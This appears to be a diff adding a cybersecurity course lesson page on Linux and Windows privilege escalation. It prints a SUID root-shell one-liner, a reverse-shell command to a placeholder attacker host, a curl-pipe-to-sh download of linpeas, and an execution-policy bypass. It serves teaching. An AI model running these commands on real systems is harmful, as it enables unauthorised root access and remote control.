@@ -1,0 +1,75 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>CyberSec Lesson 15 – Privilege Escalation: Linux & Windows</title>
+  <link rel="stylesheet" href="../assets/styles.css">
+  <script src="../assets/theme.js"></script>
+</head>
+<body>
+  <button class="theme-toggle" aria-label="Toggle dark mode"></button>
+  <div class="kicker">Cyber Security · Module F · Lesson 15 of 17 · Post-Exploitation</div>
+  <h1>Privilege Escalation: Linux & Windows</h1>
+  <p class="subtitle">Elevating from a low-privilege shell (www-data / standard user) to full administrative root and SYSTEM control.</p>
+  <div class="ribbon"><a href="../INDEX.md">← Back to Course Index</a><span>Module F – Red Teaming & Enterprise Exploitation</span></div>
+
+  <h2>1 · The One Idea</h2>
+  <p>Initial access (via a web exploit or phishing payload) almost always lands an attacker in a severely restricted low-privilege security context (e.g. <code>www-data</code> on Linux, or a standard unprivileged domain account on Windows). The attacker cannot modify system files, access other users' data, or install persistent rootkits. <strong>Privilege Escalation (PrivEsc)</strong> is the systematic exploitation of OS misconfigurations, unpatched kernel vulnerabilities, and weak file permissions to seize highest privileges (<code>root</code> on Linux, <code>NT AUTHORITY\SYSTEM</code> on Windows).</p>
+
+  <h2>2 · Linux Privilege Escalation Vectors</h2>
+  <div class="card-grid">
+    <div class="card">
+      <div class="card-num">1</div>
+      <h3>SUID / SGID Binaries (GTFOBins)</h3>
+      <p>Binaries with the SUID bit set (<code>chmod u+s</code>) execute with the file owner's privileges (usually root). If standard administrative tools (<code>find</code>, <code>vim</code>, <code>bash</code>, <code>python</code>) have SUID set, an attacker spawns an instant root shell: <code>find . -exec /bin/sh -p \; -quit</code>.</p>
+    </div>
+    <div class="card">
+      <div class="card-num">2</div>
+      <h3>Sudo Misconfigurations</h3>
+      <p>Running <code>sudo -l</code> reveals what commands the user can execute as root without a password (<code>NOPASSWD</code>). If a script or command like <code>less</code> or <code>nmap</code> is listed, shell escapes allow instant root elevation.</p>
+    </div>
+    <div class="card">
+      <div class="card-num">3</div>
+      <h3>Writable Cron Jobs & Path Hijacking</h3>
+      <p>If root executes a scheduled cron job (e.g. <code>/opt/backup.sh</code>) that is world-writable (<code>chmod 777</code>), an attacker simply appends <code>bash -i >& /dev/tcp/attacker/4444 0>&1</code> to receive a reverse root shell.</p>
+    </div>
+  </div>
+
+  <h2>3 · Windows Privilege Escalation Vectors</h2>
+  <table class="vs-table">
+    <thead>
+      <tr><th>Vector</th><th>Misconfiguration / Vulnerability</th><th>Exploitation Mechanism</th></tr>
+    </thead>
+    <tbody>
+      <tr>
+        <td><strong>Unquoted Service Paths</strong></td>
+        <td>Service path has spaces and is unquoted: <code>C:\Program Files\My App\service.exe</code>.</td>
+        <td>Windows checks: <code>C:\Program.exe</code>, then <code>C:\Program Files\My.exe</code>. If attacker has write permissions in <code>C:\</code>, dropping <code>Program.exe</code> executes with SYSTEM privileges on reboot!</td>
+      </tr>
+      <tr>
+        <td><strong>Token Impersonation (Potato Attacks)</strong></td>
+        <td>Service account possesses <code>SeImpersonatePrivilege</code> or <code>SeAssignPrimaryTokenPrivilege</code>.</td>
+        <td>Tools like <strong>JuicyPotato</strong> and <strong>PrintSpoofer</strong> trick a SYSTEM process (via RPC/Named Pipes) into authenticating locally and hijack its SYSTEM security token.</td>
+      </tr>
+      <tr>
+        <td><strong>AlwaysInstallElevated</strong></td>
+        <td>Registry keys <code>AlwaysInstallElevated = 1</code> in both HKLM and HKCU.</td>
+        <td>Permits regular users to run <code>.msi</code> installers with elevated SYSTEM permissions. Attacker generates malicious MSI via <code>msfvenom</code>.</td>
+      </tr>
+    </tbody>
+  </table>
+
+  <h2>4 · Automated Privilege Escalation Enumeration</h2>
+  <pre><code># Linux Enumeration:
+curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
+
+# Windows Enumeration:
+powershell -ep bypass -c ". .\winPEASany.exe"</code></pre>
+
+  <nav class="bottom-nav">
+    <a href="0014-exploitation-frameworks-and-metasploit.html">← Lesson 14: Metasploit & LOLBAS</a>
+    <a href="0016-active-directory-attacks-and-kerberos.html">Lesson 16: Active Directory & Kerberos →</a>
+  </nav>
+</body>
+</html>
